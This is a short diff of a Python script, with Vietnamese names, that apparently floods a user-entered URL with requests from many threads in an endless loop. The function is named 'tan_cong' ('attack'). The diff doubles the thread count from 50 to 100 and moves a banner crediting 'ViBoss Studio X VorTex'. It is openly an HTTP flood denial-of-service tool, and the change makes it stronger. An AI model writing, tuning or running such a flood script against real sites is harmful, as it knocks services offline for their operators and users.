@@ -1,11 +1,6 @@
 import threading
 import requests
 
-print("""
-ViBoss Studio  X   VorTex
-http://github.com/dhungx/ 
-""")
-
 def tan_cong(target):
     try:
         while True:
@@ -14,7 +9,14 @@ def tan_cong(target):
     except requests.exceptions.ConnectionError:
         print("[!!!] Lỗi kết nối!")
 
-so_luong_luon = 50
+so_luong_luon = 100
+
+print("""
+ViBoss Studio  X   VorTex
+
+http://github.com/dhungx/ 
+""")
+
 url = input("Nhập URL: ")
 
 try:
